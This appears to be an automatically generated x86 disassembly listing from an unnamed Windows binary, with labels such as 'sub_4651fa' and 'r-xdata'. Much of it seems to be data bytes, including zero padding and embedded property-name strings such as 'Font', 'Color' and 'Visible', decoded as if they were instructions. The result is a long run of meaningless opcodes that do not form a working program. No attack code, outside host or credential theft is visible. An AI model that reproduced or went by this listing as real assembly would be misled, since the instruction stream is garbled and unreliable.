add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 ] dh
inc ebp
js r-xdata
pushfd
adc [ eax ] al
adc [ eax ] al
add dh bh
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
pop es
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
push cs
inc esi
add [ eax + eax ] ah
add [ eax ] al
fadd [ ebp + 0x46 ]
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor al 0x4b
imul esp [ ebx + 0x69 ] 0x64695774
je r-xdata
sub_4651fa
inc [ esi ]
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
mov eax eax
pop esp
push edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4656 ] bh
add [ eax ] al
add ah cl
push edx
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] dh
push ebx
inc esi
add [ eax ] bh
add [ eax ] al
add [ eax - 0x53ffbd33 ] dh
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add al dh
int3
sub_4659bc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
lodsb [ esi ]
pop ebp
inc esi
add [ edx + ebx * 2 ] bl
inc esi
add [ ecx ] ah
pop ebx
inc esi
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5b ] ch
inc esi
add [ eax + eax ] ah
add [ eax ] al
push 0xac00425f
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ah
pop ss
dec eax
add [ eax ] ch
sbb [ eax ] cl
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
sub_465f70
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al 0x5f
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
pop edi
inc esi
add [ eax + eax ] ah
add [ eax ] al
mov eax 0xac004659
push esi
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add ah ah
pop ss
dec eax
add [ eax ] ch
sbb [ eax ] cl
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
sub_466a2f
test al 0x40
add [ eax + 0x40a8 ] al
adc [ eax ] al
nop
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ 0x401c0000 ] al
add [ esi ] al
push ebx
outsb
jb r-xdata
fadd [ esi + eax * 2 + 0x6f440a00 ]
arpl [ ebx + 0x43 ] bp
insb
imul esp [ ebp + 0x6e ] 0x1000274
int3
add [ eax ] al
sub_466efe
inc ebx
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add [ eax ] ch
daa
inc edi
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax ] cl
cld
inc esi
add al cl
cmp [ edi ] eax
xor [ edx ] ch
inc edi
add ah cl
adc al [ ebx ]
nop
cmp [ edi ] eax
mov [ eax ] es
inc edi
add ah bl
inc [ esi ]
cmp [ edi + eax * 2 ] cl
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add al al
cli
inc esi
add ah bh

sub_466f4e
inc ebx
add ah ah
and [ edi ] al
loopne r-xdata
inc edi
add [ eax ] cl
std
inc esi
add [ ebx + edi + 0x47 ] ah
add [ eax - 0x5bffb8c5 ] dl
inc [ esi ]
and [ edi + eax * 2 ] cl
add [ eax - 0x57ffb901 ] ah
or eax 0xd240047
inc edi
add [ eax + edx + 0x47 ] dl
add ah ch
push cs
inc edi
add [ eax + 0x24 ] al
inc edi
add [ edi * 8 + 0x3c140046 ] al
inc edi
add [ eax - 0x47ffb8ed ] bl
adc al 0x47
add al dh
add [ edi ] eax
cwde
adc al 0x47
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x12 ] al
inc eax
add [ eax + 0x40000000 ] al
adc al [ eax ]
add [ fs : eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dl
add ah dl
mov [ 0x340046 ] eax
add [ eax ] al
pop es
inc esi
push eax
popad
jb r-xdata
inc edi
add [ eax - 0x3fffb8df ] dh
inc edi
add ah ah
pop ss
inc edi
add al ch
pop ss
inc edi
add ah al
std
inc esi
add ah cl
pop es
inc edi
add [ edi + eax ] dh
inc edi
add ah dl
adc [ edi ] eax
or ch bh
add [ eax ] dl
add [ eax ] al
or eax 0x6e6f4346
je r-xdata
outsb
je r-xdata
je r-xdata
outsd
insb
push ebx
je r-xdata
dec eax
loope r-xdata
add [ eax ] al
inc ecx
inc esi
add [ edi ] bl
add [ eax ] al
or [ esi + 0x44 ] eax
jb r-xdata
outsd
outsb
je r-xdata
pop esp
insb
add al [ gs : eax ]
add [ eax + 0x3f ] al
inc esi
add [ eax + eax ] dl
add [ 0x6e6f4346 ] cl
je r-xdata
je r-xdata
add [ eax ] bh
add [ eax ] al
add [ ebx ] cl
inc esi
push edi
imul ebp [ esi + 0x64 ] 0x7250776f
outsd
arpl [ edx ] ax
add [ eax ] al
pushfd
adc [ eax ] al
inc eax
add [ eax ] al
add [ 0x66654c46 ] al
je r-xdata
add [ ecx + esi * 2 ] bh
inc esp
add [ eax + eax ] ah
add [ 0x6e6f4646 ] al
je r-xdata
dec ebp
outsd
add al [ gs : eax ]
add [ eax ] al
adc [ eax ] al
pushad
add [ eax ] al
add [ edx ] cl
inc esi
dec ecx
add [ esi + eax * 2 ] cl
push eax
add [ eax ] dl
inc eax
add [ eax + eax ] bl
add [ eax ] al
inc esi
inc edx
outsb
je r-xdata
outsd
insb
outsd
jb r-xdata
outsd
insb
push ebx
je r-xdata
or [ esi + 0x56 ] al
imul esi [ ebx + 0x69 ] 0x2656c62
add [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] bl
add [ eax ] al
or [ esi + 0x45 ] al
outsb
popad
bound ebp [ ebp + 0x64 ]
add al [ eax ]
add [ eax ] al
adc [ eax ] al
pop ebx
add [ eax ] al
add [ ebx ] cl
inc esi
push eax
popad
jb r-xdata
add al [ eax ]
add [ eax + edx + r--data ] bl
add [ eax ] al
pop es
pushfd
adc [ eax ] al
inc esp
add [ eax ] al
add [ esi + eax * 2 ] al
push esp
outsd
jo r-xdata
add [ eax ] al
or al 0x3e
inc esi
add [ eax ] ch
add [ eax ] al
or eax [ esi + 0x41 ]
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x58000002
add [ eax ] al
inc ecx
outsd
outsb
je r-xdata
inc ebx
outsd
outsb
jae r-xdata
outsb
je r-xdata
jae r-xdata
add [ eax ] dl
inc eax
add [ eax ] ah
add [ eax ] al
add al 0x2b
inc esi
add [ ebp ] bl
add [ eax ] al
push es
inc esi
add [ eax ] al
add [ eax ] al
je r-xdata
or al [ esi + 0x49 ]
outsb
inc esi
dec eax
imul esp [ gs : edi + 0x68 ] 0x274
les eax [ eax + 0x46 ]
pushfd
adc [ eax ] al
dec eax
add [ eax ] al
add [ esi ] al
inc esi
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
dec esp
add [ eax ] al
add [ edi ] al
add [ eax ] al
mov esp 0x70004644
add [ eax ] al
add [ esi + eax * 2 ] cl
add [ eax ] al
inc ebx
jne r-xdata
add al [ eax ]
inc esp
imul eax [ ecx + ebp * 2 + 0x4d ] 0x265646f
add [ eax ] al
add [ eax ] dl
inc eax
add [ edx ] ah
add [ eax ] al
cmovbe edx [ eax + 0x61 ]
jb r-xdata
outsd
insb
add al [ eax ]
add [ eax + 0x45 ] dh
inc edx
add [ ecx ] ah
add [ eax ] al
or [ esi + 0x42 ] eax
add [ eax ] al
or eax [ esi + 0x46 ]
outsd
outsb
je r-xdata
jb r-xdata
add [ eax + eax ] ch
add [ esi ] al
inc esi
inc ebx
outsd
insb
outsd
jb r-xdata
imul eax [ edx ] 0x0
add [ eax + 0x67 ] bl
inc esp
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x265646f
add [ eax ] al
cmp al 0x43
inc esi
add [ ebx ] ah
add [ eax ] al
or [ esi + 0x41 ] al
outsd
push ebx
imul edi [ edx + 0x65 ] 0x98000002
popad
jb r-xdata
add al [ eax ]
add [ eax ] al
adc [ eax ] al
pop eax
add [ eax ] al
add [ esi + eax * 2 ] cl
inc esp
jae r-xdata
add [ eax ] al
jae r-xdata
outsd
ja r-xdata
imul esp [ gs : edi + 0x68 ] 0x274
add [ eax ] al
add eax 0x6e694846
imul ebp [ esi + 0x74 ] 0x273
dec eax
inc esi
add [ eax + eax ] dh
add [ eax ] cl
inc esi
dec ebp
popad
jb r-xdata
inc ecx
insb
imul esp [ edi + 0x6e ] 0x2
adc [ eax ] al
pop esi
add [ eax ] al
add [ ecx ] cl
inc esi
inc ecx
je r-xdata
add [ eax ] dl
inc eax
add [ edx + 0xf000000 ] cl
inc esi
push eax
popad
add [ eax ] al
push 0x6948776f
outsb
je r-xdata
add al [ eax ]
add [ eax ] al
adc [ eax ] al
mov [ eax ] eax
jb r-xdata
imul edx [ ebx + 0x69 ] 0x74
add al [ gs : eax ]
imul ebp [ esi + 0x74 ] 0x20000002
inc edx
inc esi
add [ eax ] dl
inc eax
add [ ecx + 0x9000000 ] cl
inc esi
push ebx
pushfd
adc [ eax ] al
test [ eax ] al
add [ eax ] al
fadd [ edx + 0x46 ]
add [ eax + 0xd000000 ] cl
inc esi
push ebx
arpl [ ecx + 0x6c ] sp
imul ebp [ esi + 0x67 ] 0x67616c46
jae r-xdata
imul esp [ edi + 0x68 ] 0x274
imul ebp [ esi + 0x73 ] 0xd0000002
daa
inc esi
add [ eax ] bh
add [ eax ] al
pop es
inc esi
jne r-xdata
add [ eax ] al
add [ eax ] dl
inc eax
add [ esi ] bl
add [ eax ] al
or [ esi + 0x41 ] eax
jo r-xdata
arpl [ ebx + 0x75 ] sp
insd
jne r-xdata
insb
inc ecx
outsb
je r-xdata
shl [ edi ] 0x1
inc esi
add [ edx ] bh
add [ eax ] al
or eax [ esi + 0x44 ]
jb r-xdata
add [ eax ] al
add [ eax + 0x16000000 ] ch
popad
je r-xdata
add [ esi + eax * 2 ] cl
push ebp
outsb
outsd
arpl [ ebx + 0x57 ] bp
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
pushfd
dec ebx
imul ebp [ esi + 0x64 ] 0x70000002
outsb
inc esi
add [ eax + eax + 0x46100000 ] cl
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jb r-xdata
adc [ eax ] al
outsd
outsb
je r-xdata
add [ eax + edx + 0x940040 ] bl
add [ eax ] al
adc [ esi + 0x57 ] eax
push 0x6948776f
outsb
inc ebx
jne r-xdata
add [ eax ] al
or al 0x46
outsb
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x43 ] 0x7373616c
add al [ eax ]
add al ah
pop edi
inc esi
add [ eax + eax + 0x460d0000 ] ch
push esp
outsd
jne r-xdata
inc esi
inc esi
insb
outsd
popad
je r-xdata
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x274
pushfd
adc [ eax ] al
mov al [ 0xc000000 ]
inc esi
dec eax
outsb
je r-xdata
add [ eax ] dl
inc eax
add [ ecx ] bl
add [ eax ] al
add [ eax ] al
add [ ebx + 0x9000000 ] cl
inc esi
inc esp
jb r-xdata
and [ edx + 0x46 ] al
add [ eax ] al
jae r-xdata
imul edi [ edx + 0x65 ] 0x34000002
imul eax [ esi ] 0xf0
or al 0x46
inc esp
outsd
ja r-xdata
or al 0x46
push 0x616e614d
jb r-xdata
pushfd
adc [ eax ] al
cwde
add [ eax ] al
add [ eax ] al
arpl [ ebx + 0x48 ] bp
outsd
je r-xdata
jb r-xdata
add [ eax ] al
adc [ eax ] al
mov al [ eax ]
add [ eax ] al
cmovbe edx [ eax + 0x61 ]
jb r-xdata
aam 0x46
jb r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al [ eax ]
add al dl
popad
inc esi
add al cl
add [ eax ] al
add [ esi + eax * 2 ] cl
outsd
arpl [ ebx + 0x2 ] bp
add [ eax ] al
pushad
inc si
add al bh
add [ eax ] al
add [ edx ] cl
inc esi
dec edi
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x2 ] bp
add [ eax ] al
call sub_46bafa
dec ebp
outsd
jbe r-xdata
pushfd
push 0x46
add [ eax + 0xc000000 ] dh
inc esi
dec edi
outsb
inc ebx
popad
outsb
push edx
jae r-xdata
add [ eax ] al
dec esp
push edx
inc esp
outsd
arpl [ ebx + 0x57 ] bp
imul esp [ esp + esi * 2 + 0x68 ] 0x9c000002
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] al
add [ 0x44425446 ] cl
outsd
arpl [ ebx + 0x48 ] bp
imul esp [ gs : edi + 0x68 ] 0x274
mov al 0x29
inc esi
add al [ eax ]
add [ eax + edx + 0xa00040 ] bl
add [ eax ] al
or al 0x46
outsd
outsb
add al [ eax ]
add ah dl
mov [ 0x900046 ] eax
add [ eax ] al
or eax 0x736f4846
je r-xdata
lodsb [ esi ]
stosd [ edi ]
inc ebp
add [ eax + eax ] bh
add [ edx ] cl
inc esi
push eax
outsd
jo r-xdata
add [ eax ] al
outsd
jne r-xdata
js r-xdata
add [ eax ] ah
add [ eax ] eax
add [ edi ] cl
inc esi
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
fsubr [ ebp + 0x46 ]
inc esp
dec edi
outsb
push ebx
je r-xdata
inc esi
add al [ eax ]
add [ eax ] dl
popad
inc esi
add al dl
add [ eax ] al
add [ edx ] cl
inc esi
dec edi
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
jpe r-xdata
add [ eax ] al
add [ 0x646e5546 ] cl
outsd
push 0x416c6565
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x2 ] 0x109c0000
inc eax
add [ eax + eax + 0x46110000 ] dl
push edi
je r-xdata
jo r-xdata
add [ esi + eax * 2 ] cl
dec eax
insb
jo r-xdata
push edi
push 0x26c6565
add [ eax ] al
and [ ebp + 0x46 ] ch
add [ eax + 0x1 ] cl
add [ eax ] al
adc [ esi + 0x4f ] eax
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] eax
add [ ecx ] dl
inc esi
push eax
outsd
jo r-xdata
imul eax [ edx ] 0x0
push ebp
add al ch
inc esi
add [ eax ] al
add [ eax ] eax
add [ esi + eax * 2 ] cl
dec edi
outsb
inc esp
jb r-xdata
jo r-xdata
add al [ eax ]
add [ ebx + ebp * 2 + 0x46 ] dl
add [ eax + 0x14000000 ] bh
inc esi
dec edi
outsb
inc ebx
outsd
outsb
jae r-xdata
add [ eax ] al
or [ esi + 0x53 ] eax
outsb
jne r-xdata
je r-xdata
jns r-xdata
or al 0x46
dec eax
insb
push edi
push 0x446c6565
dec edi
jo r-xdata
jb r-xdata
push eax
inc esi
add al bl
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
jo r-xdata
or eax [ esi + 0x4f ]
jb r-xdata
je r-xdata
inc eax
adc al [ eax ]
add [ eax ] 0x0
add [ 0x6e694846 ] al
add [ eax ] al
imul ebp [ esi + 0x61 ] 0x7261506c
insd
dec eax
imul ebp [ esi + 0x74 ] 0xc8000002
adc [ eax ] eax
je r-xdata
add al [ eax ]
add [ eax + 0x7c0040a8 ] eax
add [ eax ] eax
outsd
jb r-xdata
add [ eax ] al
outsd
outsb
je r-xdata
jo r-xdata
add al [ eax ]
insb
add [ eax ] al
inc ecx
bound eax [ esi ]
sub [ ecx ] al
add [ eax ] al
adc [ esi + 0x4f ] al
outsb
dec ebp
outsd
jne r-xdata
add al [ bx + si ]
add [ eax + 0x66 ] ah
inc esi
jo r-xdata
add [ eax ] al
add [ eax ] cl
add [ eax ] eax
add [ edx ] cl
inc esi
dec edi
add [ eax ] al
pushad
inc si
dec edi
jbe r-xdata
popad
dec edi
outsb
dec ebp
outsd
jne r-xdata
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] 0x10000002
popad
inc esi
add al al
add [ eax ] al
add [ esi + eax * 2 ] cl
inc eax
add [ eax + 0xf000001 ] ah
imul edi [ edx + 0x65 ] 0x9c010002
adc [ eax ] al
xchg esp eax
add [ eax ] eax
add [ 0x70784546 ] cl
insb
imul esp [ ebx + 0x69 ] 0x66654c74
je r-xdata
je r-xdata
add [ 0x78655446 ] al
je r-xdata
jne r-xdata
js r-xdata
add al [ eax ]
add [ esi + eax * 2 + 0x42 ] bl
add [ eax + 0x1 ] ch
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + 0x1 ] bh
add [ ecx ] al
jl r-xdata
js r-xdata
je r-xdata
push edi
push 0x556c6565
add [ eax ] ah
insd
inc esi
add [ eax + 0x1 ] dl
add [ eax ] al
cmovbe ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
inc ecx
outsd
ja r-xdata
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] dh
add [ eax ] eax
add [ 0x4d6e4f46 ] cl
outsd
jne r-xdata
je r-xdata
inc edx
add [ eax ] bl
add [ eax ] eax
add [ ebx ] cl
inc esi
dec edi
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] 0xdc000002
insd
inc esi
add al [ bx + si ]
add ah dl
inc esi
inc edx
add [ eax ] dl
add [ eax ] eax
add [ eax ] cl
inc esi
dec edi
push ebx
je r-xdata
outsb
inc esp
jb r-xdata
inc esi
add al ah
add [ eax ] al
add [ ebx ] cl
inc esi
dec edi
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
or al [ esi + 0x4f ]
jb r-xdata
inc esi
add [ edx ] al
hlt
insb
pushfd
adc [ eax ] al
cwde
add [ eax ] eax
add [ esi + eax * 2 ] cl
inc ebp
js r-xdata
add [ ecx ] al
add [ ecx ] al
jae r-xdata
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ ebx ] cl
inc esi
inc ecx
add [ eax ] al
or eax [ esi + 0x41 ]
je r-xdata
outsb
outsd
jbe r-xdata
add [ esi + eax * 2 ] cl
inc ecx
outsb
arpl [ eax + 0x6f ] bp
add [ eax ] al
or al 0x46
add al [ eax ]
add [ eax - 0x7bffbf58 ] eax
add [ eax ] eax
add al [ eax ]
add [ ecx + edx * 8 ] bl
inc esi
add [ ecx + eax ] ch
add [ ebx ] cl
inc esi
inc ebx
jne r-xdata
inc ecx
outsb
insd
dec eax
imul ebp [ esi + 0x74 ] 0x2
adc [ eax ] al
jo r-xdata
fmul [ esi + eax * 2 ]
pop eax
add [ eax ] eax
add [ edx ] cl
inc esi
dec edi
outsb
inc edi
jae r-xdata
add [ eax ] al
dec esp
popad
jbe r-xdata
aam 0x46
inc edx
add al ch
add [ eax ] al
add [ ecx ] cl
inc esi
dec edi
outsb
push edx
jae r-xdata
add [ eax ] al
add [ edx ] al
hlt
jb r-xdata
pop ss
jpo r-xdata
inc esi
inc ebp
js r-xdata
insb
imul esp [ ebx + 0x69 ] 0x706f5474
add al [ eax ]
add [ eax + edx + 0x19c0040 ] ebx
add [ eax ] al
push cs
in al 0x7b
insb
imul esp [ ebx + 0x69 ] 0x64695774
je r-xdata
add [ 0x636e4146 ] cl
push 0x724f726f
imul esp [ edi + 0x69 ] 0x100026e
sub [ eax + 0x18c0040 ] 0x0
sub [ eax + 0x1840040 ] 0x0
add [ ecx ] al
dec esp
jo r-xdata
outsb
imul ebp [ bp + 0x61 ] 0x7261506c
arpl [ eax + 0x6f ] bp
jb r-xdata
arpl [ ecx + 0x74 ] bp
push esp
outsd
jo r-xdata
jb r-xdata
add [ ecx ] dl
inc esi
push eax
popad
jb r-xdata
add [ eax ] al
adc [ esi + 0x50 ] eax
jae r-xdata
jne r-xdata
jo r-xdata
insb
push ebp
add al [ eax ]
add ah dl
inc esi
inc edx
add [ eax ] bh
add [ eax ] eax
add [ 0x4d6e4f46 ] cl
outsd
jne r-xdata
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] 0xd4000002
inc esi
or [ esi + 0x4f ] al
jpe r-xdata
inc ecx
jge r-xdata
add al [ fs : eax ]
add [ eax ] al
sub eax [ eax ]
imul edi [ edx + 0x46 ] 0x0
dec esp
add [ ebx ] cl
add [ ecx + 0x4d00467a ] ah
add bh bh
dec eax
jpe r-xdata
jge r-xdata
add [ edx ] al
hlt
inc esi
add [ edx ] dl
int3
add al [ eax ]
add [ eax + edx + 0x1a00040 ] ebx
add [ eax ] al
cmovbe eax [ ebp + 0x78 ]
jmp [ edx + 0x4200467c ]
imul esp [ ebx + 0x69 ] 0x69654874
push 0x1000274
pushfd
adc [ eax ] al
pushfd
add [ eax ] eax
add [ esi ] cl
inc esi
inc ebp
js r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x9c010002
adc [ eax ] al
mov al [ 0xf000001 ]
dec edi
jb r-xdata
imul ebp [ bp + 0x2 ] 0xa8800100
inc eax
add [ ecx + eax + 0x46130000 ] cl
add [ ebx ] dl
inc esi
add al [ eax ]
add [ eax - 0x73ffbf58 ] eax
add [ eax ] eax
outsb
je r-xdata
push eax
popad
jb r-xdata
outsd
add al [ gs : eax ]
add [ esi + eax * 2 + 0x42 ] bh
add [ eax + 0x1 ] ah
add [ eax ] al
or [ esi + 0x48 ] eax
insb
jo r-xdata
inc ebp
outsb
je r-xdata
add [ eax ] al
add al [ eax ]
add [ ecx + ebp * 2 ] dh
inc esi
add al dh
add [ eax ] al
add [ esi + eax * 2 ] cl
jg r-xdata
add [ edx ] dl
int1
jge r-xdata
add [ edx ] al
hlt
jg r-xdata
add [ edx ] dl
0x8fff
jb r-xdata
jne r-xdata
je r-xdata
jns r-xdata
jb r-xdata
add [ esi ] 0x42
add ah dh
add [ edx ] al
hlt
jle r-xdata
add [ esi ] 0xffc80052
adc eax [ edx + 0x520046 ]
add [ edx ] al
hlt
popad
insb
mov edi [ ebx + 0x46 ]
add [ edx ] al
hlt
in al 0x10
inc eax
add [ ecx + eax + 0x46090000 ] ah
push edx
jae r-xdata
imul esp [ gs : edi + 0x68 ] 0x1000274
add eax 0x78655446
add al [ gs : eax ]
add [ eax + 0x12 ] al
inc eax
add [ ecx + eax ] ah
inc eax
insb
inc esi
add [ eax + 0x1 ] al
add [ eax ] al
or eax 0x4d6e4f46
add [ eax ] al
clc
call [ edx + eax * 4 + 0x46 ]
add [ edx ] al
hlt
add [ esi ] 0x26004a
aam 0x81
inc esi
add [ edx ] dl
enter 0x13ff 0x82
inc esi
add [ edx ] dl
add [ edx ] al
hlt
sub_4677e7
push edi
jg r-xdata
add [ esi ] 0x4a
add [ edi ] ah
add [ esi + 0x52004682 ] bl
add bh al
call ebp
add [ esi ] 0x42
add ah dh
dec [ edx ]
add [ esi ] 0x42
add ah dh
inc [ ecx - 0x7d ]
inc esi
add [ edx ] cl
cld
inc [ eax + 0x42004683 ]
add ah dh
dec ebx
add [ esi ] 0x42
add ah dh
push ebp
add [ esi ] 0x42
add ah dh
dec [ ecx - 0x7c ]
inc esi
add [ edx ] al
hlt
add [ edx ] cl
and eax 0x46801e00
add [ edx ] al
hlt
sub_469244
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ebx - 0x5c27ffba ] dl
inc esi
add [ esi - 0x5ffb96d ] bl
xchg edi eax
inc esi
add [ esi ] cl
cdq
inc esi
add dl bl
fwait
inc esi
add [ edx + eax ] dh
add ah al
outsb
inc esi
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0xfffbfa8 ] bh
int3
sub_46927a
inc ebx
add al dl
pop eax
inc eax
add al ah
rol [ ebx ] 0xd8
pop eax
inc eax
add [ edi + ebp * 2 + 0x47 ] dh
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ebx + eax * 2 + 0x47 ] cl
add [ eax - 0x77ffb857 ] cl
pop esi
inc edi
add ah cl
adc al [ ebx ]
nop
cmp [ edi ] eax
in al 0x58
inc edi
add [ eax ] dh
inc ebp
inc edi
add [ eax ] bh
or al 0x47
add [ eax ] bl
int 0x43
add [ esi + eax * 8 - 0x3963ffbd ] ah
inc ebx
add [ eax ] ah
int 0x43
add [ eax + 0x41 ] bh
inc edi
add ah bh

sub_4692ca
inc ebx
add [ ebx - 0x5647ffb9 ] ch
inc edi
add [ ecx + ebp * 4 ] al
inc edi
add al al
inc edi
add ah ah
pop ss
inc edi
add al ch
pop ss
inc edi
add ah al
std
inc esi
add [ eax ] ch
sahf
inc edi
add [ eax - 0x62 ] cl
inc edi
add [ eax - 0x66 ] ah
inc edi
add [ eax ] cl
std
inc esi
add [ ebx + edi + 0x47 ] ah
add [ eax - 0x6bffb8c5 ] dl
add [ edi ] 0x20
or al 0x47
add [ eax - 0x57ffb901 ] ah
or eax 0xbb080047
inc edi
add [ eax + edx + 0x47 ] dl
add ah ch
push cs
inc edi
add ah ah
imul eax [ edi ] sub_46fd04
adc al 0x3c
inc edi
add [ edx + ebx * 4 - 0x6437ffb9 ] dh
inc edi
add [ eax ] ah
xchg ebp eax
inc edi
add [ ebx + ebx * 4 + 0x45a80047 ] ch
inc edi
add [ ecx + edx * 2 ] al
inc edi
add [ eax ] ah
pushad
inc edi
add [ ecx + ebx * 2 + 0x5cc00047 ] ah
inc edi
add [ eax - 0x47ffb8a6 ] bh
pushad
inc edi
add ah bl
pushad
inc edi
add [ eax + 0x61 ] dh
inc edi
add [ edi + ebx * 2 + 0x47 ] bl
add ah dh
pop esi
inc edi
add ah al
mov ecx 0x9cf40047
inc edi
add [ eax ] ah
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ ecx + edi * 4 ] bh
inc edi
add [ eax + 0xc004764 ] dh
cdq
inc edi
add [ edx + edi * 4 - 0x63a3ffb9 ] cl
inc edi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + edx * 4 ] dl
inc esi
add al cl
add [ eax ] eax
add [ eax - 0x72 ] ch
inc esi
add al dl
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] ch
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + 0x11000001 ] ch
inc esi
inc ecx
insb
imul esp [ edi + 0x6e ] 0x746e6f43
jb r-xdata
insb
outsd
jbe r-xdata
insb
dec esp
imul esi [ ebx + 0x74 ] 0xcc000002
adc [ eax ] al
lodsb [ esi ]
add [ eax ] eax
add [ ebx ] cl
inc esi
inc ecx
insb
imul esp [ edi + 0x6e ] 0x6576654c
insb
add al [ eax ]
add [ edi + ecx * 4 + 0x1ae0046 ] bl
add [ eax ] al
or eax [ esi + 0x42 ]
jbe r-xdata
add [ eax ] al
or al 0x46
insb
push edi
imul esp [ esp + esi * 2 + 0x68 ] 0xe8000002
mov es [ esi ]
mov eax 0xc000001
inc esi
inc edx
outsd
jb r-xdata
insb
inc ebp
jae r-xdata
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
or al 0x46
dec ebx
imul ebp [ esi + 0x64 ] 0xf8000002
pop [ esi ]
mov ah 0x1
add [ eax ] al
or eax [ esi + 0x42 ]
jbe r-xdata
insb
fmul [ ebp + 0x1cc0046 ]
add [ eax ] al
or [ esi + 0x49 ] al
add [ eax ] al
int3
jb r-xdata
or [ edi + 0x1af0046 ] cl
add [ eax ] al
or eax [ esi + 0x42 ]
jbe r-xdata
add [ eax ] al
jb r-xdata
imul ebp [ esi + 0x64 ] 0x2776f
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0x40000002
dec ebx
inc esi
add [ ecx + eax + 0x46080000 ] bh
push eax
popad
imul ebp [ fs : esi + 0x67 ] 0x44000002
jbe r-xdata
inc eax
insb
dec ecx
outsb
outsb
jb r-xdata
inc esp
outsd
arpl [ ebx + 0x53 ] bp
imul esi [ ebp + 0x2 ] 0x10000000
inc eax
add ch ch
add [ eax ] eax
add [ esi + eax * 2 ] cl
push eax
popad
jb r-xdata
jb r-xdata
fcomp [ edx + 0x42 ]
add ah bl
add [ eax ] eax
add [ ecx ] cl
inc esi
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
insd
dec ebp
outsd
add al [ gs : eax ]
add [ eax - 0x72 ] ch
inc esi
add al dl
add [ eax ] eax
add [ eax ] cl
inc esi
dec ecx
insd
dec esi
popad
insd
add al [ gs : eax ]
add ah bl
scasb [ edi ]
inc eax
add ah dl
add [ eax ] eax
add [ 0x72615046 ] cl
add [ eax ] eax
add [ eax ] cl
inc esi
dec ecx
add al al
add [ eax ] eax
add [ esi ] al
inc esi
inc edx
jb r-xdata
